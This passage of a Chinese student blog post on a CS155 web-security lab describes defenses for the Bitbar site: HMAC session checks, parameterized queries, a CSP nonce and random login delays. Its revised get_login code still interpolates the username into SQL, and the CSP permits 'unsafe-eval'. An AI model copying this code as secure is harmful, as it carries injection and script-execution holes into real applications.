class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br>创建 session.hmac:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Charlie and Delta defense: update HMAC after setting profile */</span></span><br><span class="line">  req.<span class="property">session</span>.<span class="property">hmac</span> = <span class="title function_">setHMAC</span>(req.<span class="property">session</span>);</span><br></pre></td></tr></table></figure>
<p>验证 session.hmac:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Charlie and Delta defense: unset the session if HMAC doesn&#x27;t equal */</span></span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_">checkHMAC</span>(req.<span class="property">session</span>)) &#123;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">loggedIn</span> = <span class="literal">false</span>;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">account</span> = &#123;&#125;;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">hmac</span> = <span class="title function_">setHMAC</span>(req.<span class="property">session</span>);</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<h3 id="Echo-防御"><a href="#Echo-防御" class="headerlink" title="Echo 防御"></a>Echo 防御</h3><h4 id="网页漏洞-3"><a href="#网页漏洞-3" class="headerlink" title="网页漏洞"></a>网页漏洞</h4><p>用户的输入会被直接包含在SQL查询中，攻击者通过输入恶意SQL代码，来操纵后端数据库的查询。</p>
<h4 id="防御方法-2"><a href="#防御方法-2" class="headerlink" title="防御方法"></a>防御方法</h4><p>参数化查询（Parameterized Query 或 Parameterized Statement）是访问数据库时，在需要填入数值或数据的地方，使用参数 (Parameter) 来给值。</p>
<p>在使用参数化查询的情况下，数据库服务器不会将参数的内容视为SQL指令的一部份来处理，而是在数据库完成SQL指令的编译后，才套用参数运行，因此就算参数中含有指令，也不会被数据库运行。Access、SQL Server、MySQL、SQLite等常用数据库都支持参数化查询。</p>
<h4 id="代码完善-3"><a href="#代码完善-3" class="headerlink" title="代码完善"></a>代码完善</h4><p>将router中所有SQL查询的操作都改为参数化查询：</p>
<p>&#x2F;set_profile:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Echo defense: optimize the SQL query method by parameterized query */</span></span><br><span class="line">  <span class="keyword">const</span> query = <span class="string">`UPDATE Users SET profile = ? WHERE username = ?;`</span>;</span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">await</span> db.<span class="title function_">run</span>(query, [req.<span class="property">body</span>.<span class="property">new_profile</span>, req.<span class="property">session</span>.<span class="property">account</span>.<span class="property">username</span>]);</span><br></pre></td></tr></table></figure>

<p>&#x2F;close:<br> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Echo defense: optimize the SQL query method by parameterized query */</span></span><br><span class="line"> <span class="keyword">const</span> query = <span class="string">`DELETE FROM Users WHERE username == ?;`</span>;</span><br><span class="line"> <span class="keyword">await</span> db.<span class="title function_">get</span>(query, req.<span class="property">session</span>.<span class="property">account</span>.<span class="property">username</span>);</span><br></pre></td></tr></table></figure></p>
<p>&#x2F;post_transfer:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Echo defense: optimize the SQL query by parameterized query*/</span></span><br><span class="line">  <span class="keyword">let</span> query = <span class="string">`SELECT * FROM Users WHERE username == ?;`</span>;</span><br><span class="line">  <span class="keyword">const</span> receiver = <span class="keyword">await</span> db.<span class="title function_">get</span>(query, req.<span class="property">body</span>.<span class="property">destination_username</span>);</span><br></pre></td></tr></table></figure>

<p>&#x2F;post_transfer:<br> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Echo defense: optimize the SQL query by parameterized query*/</span></span><br><span class="line">   query = <span class="string">`UPDATE Users SET bitbars = ? WHERE username == ?;`</span>;</span><br><span class="line">   <span class="keyword">await</span> db.<span class="title function_">exec</span>(query, [req.<span class="property">session</span>.<span class="property">account</span>.<span class="property">bitbars</span>, req.<span class="property">session</span>.<span class="property">account</span>.<span class="property">username</span>]);</span><br><span class="line">   query = <span class="string">`UPDATE Users SET bitbars = ? WHERE username == ?;`</span>;</span><br><span class="line">   <span class="keyword">await</span> db.<span class="title function_">exec</span>(query, [receiverNewBal, receiver.<span class="property">username</span>]);</span><br></pre></td></tr></table></figure></p>
<h3 id="Foxtrot-防御-1"><a href="#Foxtrot-防御-1" class="headerlink" title="Foxtrot 防御"></a>Foxtrot 防御</h3><h4 id="网页漏洞-4"><a href="#网页漏洞-4" class="headerlink" title="网页漏洞"></a>网页漏洞</h4><p>profile里的内容会直接输入到文件中执行。</p>
<h4 id="防御方法-3"><a href="#防御方法-3" class="headerlink" title="防御方法"></a>防御方法</h4><h5 id="内容安全策略（CSP）"><a href="#内容安全策略（CSP）" class="headerlink" title="内容安全策略（CSP）"></a>内容安全策略（CSP）</h5><p>内容安全策略（CSP）是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本（XSS）和数据注入攻击等。XSS 攻击利用了浏览器对于从服务器所获取的内容的信任。恶意脚本在受害者的浏览器中得以运行，因为浏览器信任其内容来源，即使有的时候这些脚本并非来自于它本该来的地方。CSP 通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除 XSS 攻击所依赖的载体。</p>
<h5 id="代码完善-4"><a href="#代码完善-4" class="headerlink" title="代码完善"></a>代码完善</h5><p>首先，在 profile 路由产生后增加一个新的 HTTP 请求头”Content-Security-Policy”：<br> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Foxtrot defense: add CSP request header and generate a random nonce */</span></span><br><span class="line"> <span class="keyword">const</span> nonceToken = <span class="title function_">generateRandomness</span>();</span><br><span class="line"> res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Security-Policy&#x27;</span>, <span class="string">`script-src &#x27;nonce-<span class="subst">$&#123;nonceToken&#125;</span>&#x27; &#x27;unsafe-eval&#x27;`</span>);</span><br></pre></td></tr></table></figure></p>
<p>其次，为profile的页面添加nonce标签来限制可执行的脚本。nonce 值是每次 HTTP 回应给出一个授权token ，页面内嵌脚本有这个 token，才会执行：</p>
<ol>
<li>随机生成 nonceToken 用于后续授权；</li>
<li>设置 HTTP 请求头’Content-Security-Policy’，设置其内容为 <code>script-src ’nonce-$&#123;nonceToken&#125;’’unsafe-eval’</code>；<figure class="highlight plaintext"><figcaption><span>’nonce-$&#123;nonceToken&#125;’```：仅运行 nonce 值为 nonceToken 的脚本；</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">```unsafe-eval```：运行不安全的 eval 函数，保证动态展示 Bitbars 数量而用到的 setTimeout 函数；</span><br><span class="line">```javascript</span><br><span class="line">&lt;span id=&quot;bitbar_count&quot; class=&quot;&lt;%= result.bitbars %&gt;&quot; /&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot; nonce=&quot;&lt;%= nonceToken %&gt;&quot;&gt;</span><br><span class="line">      var total = eval(document.getElementById(&#x27;bitbar_count&#x27;).className);</span><br><span class="line">      function showBitbars(bitbars) &#123;</span><br><span class="line">        document.getElementById(&quot;bitbar_display&quot;).innerHTML = bitbars + &quot; bitbars&quot;;</span><br><span class="line">        if (bitbars &lt; total) &#123;</span><br><span class="line">          setTimeout(&quot;showBitbars(&quot; + (bitbars + 1) + &quot;)&quot;, 20);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      if (total &gt; 0) showBitbars(0);  // count up to total</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
使用attacker查看profile：<br><img src="/figure/defense6_1.png" alt="defense6_1"></li>
</ol>
<p>使用user1查看attacker：<br><img src="/figure/defense6_2.png" alt="defense6_2"></p>
<h3 id="Gamma-防御"><a href="#Gamma-防御" class="headerlink" title="Gamma 防御"></a>Gamma 防御</h3><h4 id="网页漏洞-5"><a href="#网页漏洞-5" class="headerlink" title="网页漏洞"></a>网页漏洞</h4><p>验证密码所需的时间受到操作数据的影响。</p>
<h4 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h4><p>设置一个显式的等待时间，使得不论是登录成功还是登录失败，请求响应的时间是完全随机的，甚至是基本接近的，导致时序攻击失效。</p>
<h4 id="代码完善-5"><a href="#代码完善-5" class="headerlink" title="代码完善"></a>代码完善</h4><p> 首先，在router中定义定义一个随机数生成函数arbitaryAwaitTime:<br> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* Gamma defense: use random sleep time to avoid timing attack */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitaryAwaitTime</span>(<span class="params">min, max</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> num = <span class="title class_">Math</span>.<span class="title function_">random</span>() * (max - min) + min;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">ceil</span>(num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>其次，在 get_login 路由中设置一个随机的休眠时间：<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> router.get(&#x27;/get_login&#x27;, asyncMiddleware(async (req, res, next) =&gt; &#123;</span><br><span class="line">  const db = await dbPromise;</span><br><span class="line">  const query = `SELECT * FROM Users WHERE username == &quot;$&#123;req.query.username&#125;&quot;;`;</span><br><span class="line">  const result = await db.get(query);</span><br><span class="line">  if(result) &#123; // if this username actually exists</span><br><span class="line">    if(checkPassword(req.query.password, result)) &#123; // if password is valid</span><br><span class="line">      //await sleep(2000);</span><br><span class="line">      </span><br><span class="line">      /* Gamma defense: generate a random await time to avoid timing */</span><br><span class="line">      const abTime = arbitaryAwaitTime(500, 1000);</span><br><span class="line">      await sleep(abTime);</span><br><span class="line">      </span><br><span class="line">      req.session.loggedIn = true;</span><br><span class="line">      req.session.account = result;</span><br><span class="line">      </span><br><span class="line">      /* Charlie and Delta defense: update HMAC after login */</span><br><span class="line">      req.session.hmac = setHMAC(req.session);</span><br><span class="line">      </span><br><span class="line">      render(req, res, next, &#x27;login/success&#x27;, &#x27;Bitbar Home&#x27;);</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  /* Gamma defense: generate a random await time to avoid timing */</span><br><span class="line">  const abTime = arbitaryAwaitTime(500, 1000);</span><br><span class="line">  await sleep(abTime);</span><br><span class="line">  </span><br><span class="line">  render(req, res, next, &#x27;login/form&#x27;, &#x27;Login&#x27;, &#x27;This username and password combination does not exist!&#x27;);</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure></p>
<p> 运行发现所有时间均为200:<br><img src="/figure/defense7_1.png" alt="defense7_1"></p>
<h2 id="心得体会"><a href="#心得体会" class="headerlink" title="心得体会"></a>心得体会</h2><p>在进行实验时，我基于bitbar网站进行了七种Web攻击方法的实践，并尝试进行相应的防御。这七种攻击方法分别是：Cookie窃取、跨站请求伪造、使用Cookie进行会话劫持、通过Cookie篡改实现恶意操作、SQL注入、个人资料蠕虫、基于时序攻击的密码提取。</p>
<p>通过这次实验，我对Web应用程序中的安全问题有了更深入的了解。我意识到在现代互联网环境中，各种Web攻击方法层出不穷，对用户和系统造成的潜在威胁不可小觑。同时，我也认识到了保护Web应用程序和用户数据的重要性。</p>
<p>在实践过程中，我首先了解了每种攻击方法的原理和实施方式。这包括攻击者如何通过Cookie窃取用户身份信息，如何利用跨站请求伪造进行恶意操作，以及如何通过会话劫持和Cookie篡改来获取特权访问等。这些知识让我认识到，攻击者可以利用Web应用程序的漏洞进行各种形式的攻击，而且这些攻击方法往往是隐蔽且具有破坏力的。</p>
<p>接着，我尝试了相应的防御方法，学习了如何加密和保护Cookie，以防止其被窃取和篡改。我还学习了如何使用CSRF令牌来防止跨站请求伪造攻击，并且采取了其他安全措施，如使用加密通信和强密码来保护用户数据。此外，我还学习了如何对输入进行有效的过滤和验证，以防止SQL注入等攻击。</p>
<p>通过实验，我发现实施防御措施并不是一劳永逸的。Web应用程序的安全需要持续的关注和更新。新的攻击方法和漏洞随时可能出现，因此我们需要时刻保持警惕，及时更新和改进我们的防御手段。</p>
<p>总的来说，这次实验让我对Web应用程序的安全性有了更深入的认识，并且学到了许多有关防御Web攻击的方法。这次实践使我明白了保护Web应用程序和用户数据的重要性，以及持续关注安全问题的必要性。我相信这些知识和经验将对我未来在Web开发和网络安全领域的学习有很大的帮助。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">Zhu Siqi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/07/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9AWeb%20Attacks%20and%20Defenses/">http://example.com/2024/07/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9AWeb%20Attacks%20and%20Defenses/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CS155/">CS155</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/07/26/AI%E8%AF%AD%E9%9F%B3%E5%90%88%E6%88%90%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E4%BD%BF%E7%94%A8GPT-SoVits%E8%BF%9B%E8%A1%8C%E6%97%A5%E5%B8%B8%E8%AF%B4%E8%AF%9D%E8%AF%AD%E9%9F%B3%E5%90%88%E6%88%90/" title="AI语音合成（一）：使用GPT-SoVits进行日常说话语音合成"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">AI语音合成（一）：使用GPT-SoVits进行日常说话语音合成</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Zhu Siqi</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%90%86%E8%AE%BA%E8%AF%BE%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1"><span class="toc-number">1.</span> <span class="toc-text">网络安全理论课第一次实验：网络攻击和防御</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">实验介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.1.</span> <span class="toc-text">项目介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E6%8C%87%E5%AF%BC"><span class="toc-number">1.1.2.</span> <span class="toc-text">安装指导</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A6%81%E6%B1%82"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">浏览器要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E8%AE%BE%E7%BD%AE%E8%AF%B4%E6%98%8E"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">具体设置说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Docker-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">Docker 使用技巧</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.</span> <span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="toc-number">1.3.</span> <span class="toc-text">参考文献</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE%E8%AF%B4%E6%98%8E"><span class="toc-number">1.4.</span> <span class="toc-text">项目说明</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5%E8%AF%B4%E6%98%8E"><span class="toc-number">1.4.1.</span> <span class="toc-text">概念说明</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#HTTP-COOKIE"><span class="toc-number">1.4.1.0.1.</span> <span class="toc-text">HTTP COOKIE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84"><span class="toc-number">1.4.2.</span> <span class="toc-text">项目结构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#app-js"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">app.js</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#router-js"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">router.js</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#set-profile-%E8%B7%AF%E7%94%B1"><span class="toc-number">1.4.2.2.1.</span> <span class="toc-text">&#x2F;set_profile 路由:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#post-register-%E8%B7%AF%E7%94%B1"><span class="toc-number">1.4.2.2.2.</span> <span class="toc-text">&#x2F;post_register 路由</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#post-transfer%E8%B7%AF%E7%94%B1"><span class="toc-number">1.4.2.2.3.</span> <span class="toc-text">post_transfer路由</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%B9%E8%B7%AF%E5%BE%84-%E8%B7%AF%E7%94%B1"><span class="toc-number">1.4.2.2.4.</span> <span class="toc-text">根路径 &#x2F; 路由</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#login-%E8%B7%AF%E7%94%B1"><span class="toc-number">1.4.2.2.5.</span> <span class="toc-text">&#x2F;login 路由</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#get-login-%E8%B7%AF%E7%94%B1"><span class="toc-number">1.4.2.2.6.</span> <span class="toc-text">&#x2F;get_login 路由</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#register-%E8%B7%AF%E7%94%B1"><span class="toc-number">1.4.2.2.7.</span> <span class="toc-text">&#x2F;register 路由</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#close-%E8%B7%AF%E7%94%B1"><span class="toc-number">1.4.2.2.8.</span> <span class="toc-text">&#x2F;close 路由</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#logout-%E8%B7%AF%E7%94%B1"><span class="toc-number">1.4.2.2.9.</span> <span class="toc-text">&#x2F;logout 路由</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#profile-%E8%B7%AF%E7%94%B1"><span class="toc-number">1.4.2.2.10.</span> <span class="toc-text">&#x2F;profile 路由</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#transfer-%E8%B7%AF%E7%94%B1"><span class="toc-number">1.4.2.2.11.</span> <span class="toc-text">&#x2F;transfer 路由</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#steal-cookie-%E5%92%8C-steal-password-%E8%B7%AF%E7%94%B1"><span class="toc-number">1.4.2.2.12.</span> <span class="toc-text">&#x2F;steal_cookie 和 &#x2F;steal_password 路由</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">其他文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#view-pages"><span class="toc-number">1.4.2.3.1.</span> <span class="toc-text">view&#x2F;pages</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#db-migrate-002-add-initial-users-sql"><span class="toc-number">1.4.2.3.2.</span> <span class="toc-text">db&#x2F;migrate&#x2F;002-add-initial-users.sql</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%EF%BC%9A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">1.5.</span> <span class="toc-text">第一部分：攻击方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8Alpha%EF%BC%9ACookie%E7%AA%83%E5%8F%96"><span class="toc-number">1.5.1.</span> <span class="toc-text">漏洞利用Alpha：Cookie窃取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%A6%81%E6%B1%82"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">攻击要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">实验原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS"><span class="toc-number">1.5.1.2.1.</span> <span class="toc-text">XSS</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">实验过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Cookie%E5%BD%A2%E5%BC%8F%E6%8E%A2%E7%A9%B6"><span class="toc-number">1.5.1.3.1.</span> <span class="toc-text">Cookie形式探究</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95"><span class="toc-number">1.5.1.3.2.</span> <span class="toc-text">XSS攻击测试</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AA%83%E5%8F%96cookie"><span class="toc-number">1.5.1.3.3.</span> <span class="toc-text">窃取cookie</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8Bravo%EF%BC%9A%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-number">1.5.2.</span> <span class="toc-text">漏洞利用Bravo：跨站请求伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%BB%E5%8A%A1%E8%AF%B4%E6%98%8E"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">实验任务说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">实验原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CSRF"><span class="toc-number">1.5.2.2.1.</span> <span class="toc-text">CSRF</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-1"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">实验过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BD%AC%E8%B4%A6%E8%A1%A8%E5%8D%95%E6%8E%A2%E7%A9%B6"><span class="toc-number">1.5.2.3.1.</span> <span class="toc-text">转账表单探究</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E8%AF%B7%E6%B1%82"><span class="toc-number">1.5.2.3.2.</span> <span class="toc-text">伪造请求</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8Charlie-%EF%BC%9A%E4%BD%BF%E7%94%A8-Cookie-%E8%BF%9B%E8%A1%8C%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81"><span class="toc-number">1.5.3.</span> <span class="toc-text">漏洞利用Charlie ：使用 Cookie 进行会话劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%BB%E5%8A%A1%E8%AF%B4%E6%98%8E-1"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">实验任务说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86-2"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">实验原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81"><span class="toc-number">1.5.3.2.1.</span> <span class="toc-text">会话劫持</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.5.3.3.</span> <span class="toc-text">实验步骤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8Delta-%EF%BC%9A%E4%BD%BF%E7%94%A8-Cookies-%E7%AF%A1%E6%94%B9%E4%B9%A6%E7%AD%BE"><span class="toc-number">1.5.4.</span> <span class="toc-text">漏洞利用Delta ：使用 Cookies 篡改书签</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%BB%E5%8A%A1%E8%AF%B4%E6%98%8E-2"><span class="toc-number">1.5.4.1.</span> <span class="toc-text">实验任务说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 